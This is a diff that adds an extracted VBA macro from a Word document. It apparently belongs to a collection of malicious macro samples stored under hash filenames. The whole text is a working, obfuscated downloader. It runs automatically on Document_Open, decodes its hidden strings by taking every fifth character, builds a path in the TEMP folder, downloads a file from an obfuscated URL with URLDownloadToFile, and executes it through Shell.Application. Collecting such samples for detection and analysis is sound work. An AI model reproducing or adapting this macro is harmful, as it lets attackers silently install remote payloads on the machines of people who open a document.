@@ -1,0 +1,136 @@
+Filename     : ./macros/80e4361c778e7d8b8d1702081dfa67ebaaa890609b1c9185e5491d4f3a9b62bf
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+#If 1 And VBA7 And Win64 And 1 And 1 And 1 Then
+Private syvVw0X As Integer
+Private lCSqM7n8Y As Integer
+Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias _
+"URLDownloadToFileA" (ByVal AmXkbzTc4PHDnzK As Long, _
+ByVal kyvnyBPxSYRJ As String, _
+ByVal r5qaA5RBtxXvFfAze As String, _
+ByVal p2AdvApNZH2XAn1jCM As Long, _
+ByVal oF4Z4xG2 As Long) As LongPtr
+Private jnTtZHCzWSvPLhruqQ As Integer
+Private FwycR3mXT5 As Integer
+#Else
+Private syvVw0X As Integer
+Private XCfEXtuhnoq As Integer
+Private Declare Function URLDownloadToFile Lib "urlmon" Alias _
+"URLDownloadToFileA" (ByVal AmXkbzTc4PHDnzK As Long, _
+ByVal kyvnyBPxSYRJ As String, _
+ByVal r5qaA5RBtxXvFfAze As String, _
+ByVal p2AdvApNZH2XAn1jCM As Long, _
+ByVal oF4Z4xG2 As Long) As Long
+Private Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal ZepwE As String, ByVal iadV4FD7A As Long, ByVal CagxH As String, ByVal OmEFK As String, ByVal MpgmOI As Long) As Long
+Private Declare Function InternetCloseHandle Lib "wininet" (ByVal UAbmBJeSlFzOW2Jmp As Long) As Integer
+Private Declare Function InternetReadFile Lib "wininet" (ByVal IbjMR6 As Long, ByVal FZ9EZQjr9Xvy As String, ByVal lxPeoXEqo222rg6g78 As Long, VJwkVDCpFWMVOov As Long) As Integer
+Private Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal KC5YurcRX6 As Long, ByVal hkdB1OC As String, ByVal apDuRchzKRW As String, ByVal EwKlU2anehUDO0 As Long, ByVal qLL6CLLW7Iew As Long, ByVal rH00TxlP As Long) As Long
+Private gyoOnsKzVQ7dMy6QR As Integer
+#End If
+Public rNCfMqUa6
+Public Fs0PqgAJfG4b
+Public hnyUZS4UYUSLLPlv
+Public OyQJiWHB3m
+Public AnmSc33W5W3yhJVxV
+Public kXjufcJkaG
+Sub Document_Open()
+rNCfMqUa6 = Array("0d_h;", "0d_h;", "0d_h;", "Td:@B", "EDiW=", "MvS:Y", "P6pZ2", "Sg?=C", "h=N~/", "eqqBV", "l[)We", "l[)We", ".__)7", "A<8J9", "pL6-w", "pL6-w", "l[)We", "i:9PR", "cN(au", "a{TtN", "t:`R/", "i:9PR", "o+mab", "nkJ]a")
+Fs0PqgAJfG4b = Array(rNCfMqUa6(0), rNCfMqUa6(0), rNCfMqUa6(0), rNCfMqUa6(3), rNCfMqUa6(4), rNCfMqUa6(5), rNCfMqUa6(6), rNCfMqUa6(7), rNCfMqUa6(8), rNCfMqUa6(9), rNCfMqUa6(10), rNCfMqUa6(10), rNCfMqUa6(12), rNCfMqUa6(13), rNCfMqUa6(14), rNCfMqUa6(14), rNCfMqUa6(10), rNCfMqUa6(17), rNCfMqUa6(18), rNCfMqUa6(19), rNCfMqUa6(20), rNCfMqUa6(17), rNCfMqUa6(22), rNCfMqUa6(23))
+hnyUZS4UYUSLLPlv = Array(Fs0PqgAJfG4b(0), Fs0PqgAJfG4b(0), Fs0PqgAJfG4b(0), Fs0PqgAJfG4b(3), Fs0PqgAJfG4b(4), Fs0PqgAJfG4b(5), Fs0PqgAJfG4b(6), Fs0PqgAJfG4b(7), Fs0PqgAJfG4b(8), Fs0PqgAJfG4b(9), Fs0PqgAJfG4b(10), Fs0PqgAJfG4b(10), Fs0PqgAJfG4b(12), Fs0PqgAJfG4b(13), Fs0PqgAJfG4b(14), Fs0PqgAJfG4b(14), Fs0PqgAJfG4b(10), Fs0PqgAJfG4b(17), Fs0PqgAJfG4b(18), Fs0PqgAJfG4b(19), Fs0PqgAJfG4b(20), Fs0PqgAJfG4b(17), Fs0PqgAJfG4b(22), Fs0PqgAJfG4b(23))
+OyQJiWHB3m = Array(hnyUZS4UYUSLLPlv(0), hnyUZS4UYUSLLPlv(0), hnyUZS4UYUSLLPlv(0), hnyUZS4UYUSLLPlv(3), hnyUZS4UYUSLLPlv(4), hnyUZS4UYUSLLPlv(5), hnyUZS4UYUSLLPlv(6), hnyUZS4UYUSLLPlv(7), hnyUZS4UYUSLLPlv(8), hnyUZS4UYUSLLPlv(9), hnyUZS4UYUSLLPlv(10), hnyUZS4UYUSLLPlv(10), hnyUZS4UYUSLLPlv(12), hnyUZS4UYUSLLPlv(13), hnyUZS4UYUSLLPlv(14), hnyUZS4UYUSLLPlv(14), hnyUZS4UYUSLLPlv(10), hnyUZS4UYUSLLPlv(17), hnyUZS4UYUSLLPlv(18), hnyUZS4UYUSLLPlv(19), hnyUZS4UYUSLLPlv(20), hnyUZS4UYUSLLPlv(17), hnyUZS4UYUSLLPlv(22), hnyUZS4UYUSLLPlv(23))
+AnmSc33W5W3yhJVxV = Array(OyQJiWHB3m(0), OyQJiWHB3m(0), OyQJiWHB3m(0), OyQJiWHB3m(3), OyQJiWHB3m(4), OyQJiWHB3m(5), OyQJiWHB3m(6), OyQJiWHB3m(7), OyQJiWHB3m(8), OyQJiWHB3m(9), OyQJiWHB3m(10), OyQJiWHB3m(10), OyQJiWHB3m(12), OyQJiWHB3m(13), OyQJiWHB3m(14), OyQJiWHB3m(14), OyQJiWHB3m(10), OyQJiWHB3m(17), OyQJiWHB3m(18), OyQJiWHB3m(19), OyQJiWHB3m(20), OyQJiWHB3m(17), OyQJiWHB3m(22), OyQJiWHB3m(23))
+kXjufcJkaG = Array(hhEk43SAHEm1DRr(), ic9tG(), wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(0)), wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(0)), wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(0)))
+StstCvIeel
+End Sub
+Sub StstCvIeel()
+Dim D4WtgW4v
+Dim nzKDA0XhIGDOkch
+Dim eGavXlqRLNc As String
+nzKDA0XhIGDOkch = Array(kXjufcJkaG(1129 - (2245) + (1116)), wkQLOjnTtZHCzWSvPLhruqQO("\E>BkAHe5+XQf2s]z*YK5H}px4eh9u+O.bLMemh5xH*\eJ,|"), wkQLOjnTtZHCzWSvPLhruqQO("hc8+tiOQt[o=p[L4:wL@/T~C/={tm3a<a.7wtuEwtUl}cw:0aj[2sVbT.GRLcE0rorhpm.Pm.AWVhmb@kXeQ/E.^w6(:p7hJ-9fAcHk7oog.n-+[t.NCe7^anY{wtq||/*)Kpl70l`b(uMtigTxkiG}zn9Sbsu>_/B}IfW\lrRGheDEiej*Wd}KGo[`XmYad/u:}_|_PtA3iekQ9mf1.p;zU/(8Ze*[zmJ;/mCB]a.hC.c`JenUfx?*9e~~W"), kXjufcJkaG(11942 - (1953) + (-9988)))
+Dim YohpSv
+Set YohpSv = jQKZITB(nzKDA0XhIGDOkch(-11030 - (-3201) + (7832)))
+
+eGavXlqRLNc = Environ(nzKDA0XhIGDOkch(1129 - (2245) + (1116))) + nzKDA0XhIGDOkch(11942 - (1953) + (-9988))
+Call URLDownloadToFile(kXjufcJkaG(2452 - (-878) + (-3328)), nzKDA0XhIGDOkch(2452 - (-878) + (-3328)), eGavXlqRLNc, kXjufcJkaG(2452 - (-878) + (-3328)), kXjufcJkaG(2452 - (-878) + (-3328)))
+YohpSv.Open (eGavXlqRLNc)
+End Sub
+
+Function jQKZITB(om0GOV) As Object
+Set jQKZITB = CreateObject(om0GOV)
+End Function
+
+Function wkQLOjnTtZHCzWSvPLhruqQO(nXSC7mEoZ) As String
+    Dim o7xYEb(12150 - (1595) + (-9500)) As Byte
+    Dim HxpjKtBFrnL() As Byte
+    Dim Yl9tsmOR8TYNwoVt
+    Dim hhLJ7Tscb
+    HxpjKtBFrnL = StrConv(nXSC7mEoZ, (1004 - (-3282) + (-4158)))
+    For hhLJ7Tscb = 0 To UBound(HxpjKtBFrnL) - 1
+        If (hhLJ7Tscb Mod 5 = (3058 - (-6473) + (-9531))) Then
+            o7xYEb(Yl9tsmOR8TYNwoVt) = HxpjKtBFrnL(hhLJ7Tscb)
+            Yl9tsmOR8TYNwoVt = Yl9tsmOR8TYNwoVt + 1
+        End If
+    Next hhLJ7Tscb
+    wkQLOjnTtZHCzWSvPLhruqQO = Left(StrConv(o7xYEb, (160 - (-8436) + (-8532))), Yl9tsmOR8TYNwoVt)
+End Function
+
+Function hhEk43SAHEm1DRr() As String
+Dim iuIwu
+Dim fNLeE4lqAHnP
+Dim nVOHwA50SQH
+Dim HHjgXpXet
+iuIwu = wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(3))
+fNLeE4lqAHnP = iuIwu & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(4))
+nVOHwA50SQH = fNLeE4lqAHnP & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(5))
+HHjgXpXet = nVOHwA50SQH & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(6))
+hhEk43SAHEm1DRr = HHjgXpXet
+End Function
+
+Function ic9tG() As String
+Dim R9E4cvV9q
+Dim TAnYKcLmoUCx3Ox
+Dim EcRGkXW3E3sY9VJac
+Dim MBLuTkpP4T5q7otK
+Dim OPicGU5ZTEez
+Dim NRbqKqoiyVu8Sa8Ckj
+Dim AmBD4TCh
+Dim LzWBQA6d
+Dim GU2WoQtn
+Dim ouxNjUOo6BEW
+Dim DYNyyjhHTU
+Dim TFDdylJGyNmIyG1nb4u
+Dim jtLtxRRu4nW
+Dim SQFFAA7QuFO
+Dim MFOhxw5DY5DZtKgX
+Dim PCBrMpX1m
+Dim QwUUTVbWh2kx7h
+R9E4cvV9q = wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(7))
+TAnYKcLmoUCx3Ox = R9E4cvV9q & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(8))
+EcRGkXW3E3sY9VJac = TAnYKcLmoUCx3Ox & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(9))
+MBLuTkpP4T5q7otK = EcRGkXW3E3sY9VJac & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(10))
+OPicGU5ZTEez = MBLuTkpP4T5q7otK & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(10))
+NRbqKqoiyVu8Sa8Ckj = OPicGU5ZTEez & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(12))
+AmBD4TCh = NRbqKqoiyVu8Sa8Ckj & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(13))
+LzWBQA6d = AmBD4TCh & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(14))
+GU2WoQtn = LzWBQA6d & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(14))
+ouxNjUOo6BEW = GU2WoQtn & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(10))
+DYNyyjhHTU = ouxNjUOo6BEW & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(17))
+TFDdylJGyNmIyG1nb4u = DYNyyjhHTU & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(18))
+jtLtxRRu4nW = TFDdylJGyNmIyG1nb4u & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(19))
+SQFFAA7QuFO = jtLtxRRu4nW & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(20))
+MFOhxw5DY5DZtKgX = SQFFAA7QuFO & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(17))
+PCBrMpX1m = MFOhxw5DY5DZtKgX & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(22))
+QwUUTVbWh2kx7h = PCBrMpX1m & wkQLOjnTtZHCzWSvPLhruqQO(AnmSc33W5W3yhJVxV(23))
+ic9tG = QwUUTVbWh2kx7h
+End Function
+
+
